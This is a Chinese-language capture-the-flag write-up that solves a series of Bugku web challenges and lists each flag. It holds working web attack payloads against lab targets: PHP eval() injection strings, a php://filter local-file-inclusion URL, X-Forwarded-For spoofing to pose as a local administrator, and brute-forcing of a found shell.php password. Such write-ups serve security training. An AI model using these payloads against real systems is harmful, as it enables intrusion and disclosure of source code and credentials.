## web2
查看源码,得 flag:`KEY{Web-2-bugKssNNikls9100}`

## 计算器 
要求提交算式得结果,用 JS 验证
查看源码,发现可能是 `code.js`
 然后进入查看,发现 flag:`flag{CTF-bugku-0032}`

## 矛盾
```php
$num=$_GET['num'];  
if(!is_numeric($num))  
{  
echo $num;  
if($num==1)  
echo 'flag{**********}';  
}
```
简单的 %00 绕过
直接构造 payload:`?num=1%00`
得到 flag:`flag{bugku-789-ps-ssdf}`

## web3
点开后一直弹出窗口
果断 Burp 抓包
在 Response 最后发现
```php
<!--&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;-->
```
粘贴到 Google 上,回车
得到 flag:`KEY{J2sa42ahJK-HS11III}`

## 域名解析
修改 windows 下的 `c:\windows\system32\drivers\etc\hosts`
添加
`120.24.86.145 flag.bugku.com`
访问 flag.bugku.com 得到 flag:
`KEY{DSAHDSJ82HDS2211}`

或者 Burp 抓包,修改 Host
```
GET / HTTP/1.1
Host: flag.baidu.com ##修改 Host
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
提交的 flag

## 你必须让他停下
进入链接,发现页面一直闪,果断 Burp 抓包
在 Response 里
```php
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 08 Mar 2019 05:20:52 GMT
Content-Type: text/html
Connection: close
Content-Length: 614

ï»¿<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<title>Dummy game</title>
</head>

<script language="JavaScript">
function myrefresh(){
window.location.reload();
}
setTimeout('myrefresh()',500); 
</script>
<body>
<center><strong>I want to play Dummy game with othersÂ£Â¡But I can't stop!</strong></center>
<center>Stop at panda ! u will get flag</center>
<center><div><img src="11.jpg" /></div></center><br>
<a style="display:none">flag is here~</a></body>
# 这里有猫腻
</html>
```
多提交几次
```php
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 08 Mar 2019 05:18:07 GMT
Content-Type: text/html
Connection: close
Content-Length: 630

ï»¿<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<title>Dummy game</title>
</head>

<script language="JavaScript">
function myrefresh(){
window.location.reload();
}
setTimeout('myrefresh()',500); 
</script>
<body>
<center><strong>I want to play Dummy game with othersÂ£Â¡But I can't stop!</strong></center>
<center>Stop at panda ! u will get flag</center>
<center><div><img src="10.jpg"/></div></center><br>
<a style="display:none">flag{dummy_game_1s_s0_popular}</a></body>
</html>
```
得到 flag: 
`flag{dummy_game_1s_s0_popular}`

## 本地包含
进入看见代码,为代码审计
```php
`<?php  
include "flag.php";  
$a = @$_REQUEST['hello'];  
eval( "var_dump($a);");  
show_source(__FILE__);  
?>`
```
常见 eval() 漏洞
直接构造 payload:`?hello=file('flag.php')`
得到 flag:`flag{bug-ctf-gg-99}`
```php
file_get_contents('flag.php')
show_source('flag.php')
# 均可
```
## 变量1
```php
flag In the variable ! 
<?php  
error_reporting(0);  
include "flag1.php";  
highlight_file(__file__);  
if(isset($_GET['args'])){  
$args = $_GET['args'];  
if(!preg_match("/^\w+$/",$args)){  
die("args error!");  
}  
eval("var_dump($$args);");  
}  
?>
```
进入看见代码
同样是 eval() 函数,但是它进行了正则式匹配,不能像上一题一样绕过
并且它用变量转存了提交的 `$_GET` 变量值进行验证,所以也不好利用  preg_match() 函数不能处理数组的漏洞
提示中 `flag In  the variable !` 想到 var_dump() 函数的 `$GLOBALS` 变量 `$$a` 会将 `$a` 的值替换为 `GLOBALS`,也就是说 `$$a` 会解析成 `$GLOBALS` 

综上,构造 payload:`?args=GLOBALS`
提交得到 flag:
`flag{92853051ab894a64f7865cf3c2128b34}`

## web5
查看源码,发现一堆括号
```
([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])
```
上网搜一波,发现其为 jother 编码
可以直接在控制台里运行,得到 flag:
`ctf{whatfk}`
但还没完,必须大写才能提交

## 头等舱
页面里啥也没有
果断 Burp 抓包
在 Response 里发现 flag:
`flag{Bugku_k8_23s_istra}`

## 网站被黑
源码,抓包无果,Dirsearch 扫描站点,发现 shell.php 
进入,发现一个提交框
没有验证,考虑用 Burp 爆破
使用 Burp 自带的 Passwords 作为字典爆破
之后发现 hack 的响应长度不同于其他
在提交框里提交 hack,得到 flag:
`flag{hack_bug_ku035}`

## 管理员系统
进入发现是一个登陆界面
因为是管理员系统,推测用户名为 admin 
随便输入密码提交,回显`IP禁止访问，请联系本地管理员登陆，IP已被记录.`
本地管理员,联想到伪造 IP 地址 ~~(不要问我为什么,CTF 的脑洞就是这么大)~~
Burp 抓包,修改包
```
POST / HTTP/1.1
Host: 123.206.31.85:1003
Content-Length: 20
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Origin: http://123.206.31.85:1003
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
X-Forwarded-For: 127.0.0.1 #伪造本地管理员IP
Referer: http://123.206.31.85:1003/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=admin&pass=asdf
```
提交,回显
`Invalid credentials! Please try again!`
密码不对,可以选择爆破
但查看网页源码发现 
```php
<!-- dGVzdDEyMw== -->
```
看起来是 Base64 加密
解密得到 test123 猜测其为密码
提交,得到 flag:
`The flag is: 85ff2ee4171396724bae20c0bd851f6b`
按格式提交答案

## web4 
进入提示看看源码
看到一段 JS 代码
```js
<script>

var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';

var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';

eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));

</script>
```
去掉 eval 函数在 Console 里运行
出现原文
```js
function checkSubmit(){
	var a=document.getElementById("password");
	if("undefined"!=typeof a){
		if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;
		alert("Error");
		a.focus();
		return!1
	}
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
```
分析后提交 `67d709b2b54aa2aa648cf6e87a7114f1`
得到 flag:
`KEY{J22JK-HS11}`

## flag在index里
题面只有一个链接`click me? no`
点击后会在 URL 后面加 file=show.php 
想到 php://filter 
构造 payload:`?file=php://filter/read=convert.base64-encode/resource=index.php`
得到 Base64 加密的 index.php 源码,Base64 解码得到
```php
<html>      
	<title>Bugku-ctf</title>        
	<?php   
		error_reporting(0);   
		if(!$_GET[file]){
		echo '<a href="./index.php?file=show.php">click me? no</a>';}   
		$file=$_GET['file'];   
		if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		    echo "Oh no!";    
		    exit();
	    }   
	    include($file);   			
	    //flag:flag{edulcni_elif_lacol_si_siht}  
